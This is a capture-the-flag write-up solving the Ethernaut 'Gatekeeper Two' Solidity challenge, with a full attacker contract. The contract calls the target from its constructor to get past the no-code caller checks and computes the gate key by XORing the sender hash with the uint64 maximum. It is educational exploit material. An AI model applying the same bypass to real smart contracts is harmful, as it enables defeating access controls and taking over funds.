# Gatekeeper Two Ethernaut

## Goals

=> Be able to pass all gates to call enter and get the entrant

### Hints

- None

### Solution

- Gate one and two are passed by conduction the attack through a contract with no code (conduct attack within constructor)

- You just need to calculate the key by splitting up the comparison for gateThree and pass in the calculated key

### Attacker Contract

```solidity
contract Hack {
    constructor(address _gateKeeper) {
        // gate one and two are passed by conduction the attack through a contract with no code (conduct attack within constructor)
        GatekeeperTwo gatekeeper = GatekeeperTwo(_gateKeeper);
        // gate three can be calculated
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
        uint64 key64 = uint64(
            bytes8(keccak256(abi.encodePacked(address(this))))
        );
        bytes8 key = bytes8(key64 ^ type(uint64).max);
        gatekeeper.enter(key);
    }
}
```
